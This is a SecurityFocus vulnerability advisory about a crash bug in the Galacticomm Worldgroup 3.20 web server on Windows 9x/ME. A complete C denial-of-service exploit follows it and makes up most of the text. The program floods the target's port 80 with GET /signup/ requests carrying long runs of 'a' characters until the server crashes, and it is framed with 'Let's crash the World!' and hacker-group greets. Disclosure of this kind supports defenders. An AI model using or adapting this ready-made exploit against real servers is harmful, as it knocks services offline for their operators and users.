source: http://www.securityfocus.com/bid/4186/info

Galacticomm Worldgroup is a community building package of both client and server software for Microsoft Windows. Worldgroup is based on BBS software, and includes web and ftp servers.

A vulnerability has been reported in the web server included with Worldgroup. If a HTTP GET request is received by the server consisting of a long string of arbitrary characters, the server will crash. A restart may be required in order to regain normal functionality.

Earlier versions of Worldgroup may share this vulnerability. 

/*
        by Limpid Byte project
        http://lbyte.void.ru
        lbyte@host.sk

Worldgroup Server Denial of Service for
Windows 9x/ME only.
Error between system fuction windows and
worldgroup from web interface.
REGUEST:
GET /signup/a.[aaaaaaaa....aaaa]

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>

#define FOUND "200"

int main(int argc, char *argv[])
{
        int sock, count;
        struct sockaddr_in blah;
        struct hostent *he;
        char cgiBuff[1024];
        WSADATA wsaData;

        if (argc < 2)
        {
                printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThis program crash Worldgroup servers 3.20 for windows 95/98/ME.\n");
                printf("Greets to [WhU]//[GiN]//[LByte]//[WGHACK] projects!\n\n");
                printf(" USAGE   : www_dos.exe [HOST] \n");
                printf(" example : www_dos.exe 127.0.0.1 \n");
                exit(1);
        }

        if(WSAStartup(0x101,&wsaData))
        {
                printf("Unable to initialize WinSock lib.\n");
                exit(1);
        }
        printf("Let's crash the World!\n");
        printf("Coded by the [eaSt]:\n");
        printf("\nScanning %s on port 80...\n\n", argv[1]);

        for (count = 0; count < 94; count++)
        {
                sock = socket(AF_INET,SOCK_STREAM,0);
                blah.sin_family=AF_INET;
                blah.sin_addr.s_addr=inet_addr(argv[1]);
                blah.sin_port=htons(80);
                if ((he = gethostbyname(argv[1])) != NULL)
                {
                        memcpy((char *)&blah.sin_addr, he->h_addr, he->h_length);
                }
                else
                {
                        if ((blah.sin_addr.s_addr = inet_addr(argv[1]))==INADDR_NONE)
                    {
                                WSACleanup();
                                exit(1);
                        }
                }

                if (connect(sock,(struct sockaddr*)&blah,sizeof(blah))!=0)
                {
                        WSACleanup();
                        exit(1);
                }

                memset(cgiBuff, 0, sizeof(cgiBuff));
                sprintf(cgiBuff, "GET /signup/");
                memset(cgiBuff + 12, 'a', 219 + count);
                sprintf(cgiBuff + 12 + 219 + count, ".txt?=../test.txt HTTP/1.0\n\n");
                printf("Sending: %d symbols request\n", strlen(cgiBuff));

                send(sock,cgiBuff,strlen(cgiBuff),0);
                memset(cgiBuff, 0, sizeof(cgiBuff));
                if(!recv(sock,cgiBuff,sizeof(cgiBuff),0)) {
                        printf("Crashed\n");
                }
                else {
                        cgiBuff[32] = 0;
                        if (strstr(cgiBuff,FOUND))
                        {
                                printf("Send (%s)\n", cgiBuff);
                        }
                        else
                        {
                                printf("Not Found (%s)\n", cgiBuff);
                        }
                }

                closesocket(sock);
        }

        printf("Try reconnect to %s\n", argv[1]);
        WSACleanup();
        return 0;
}
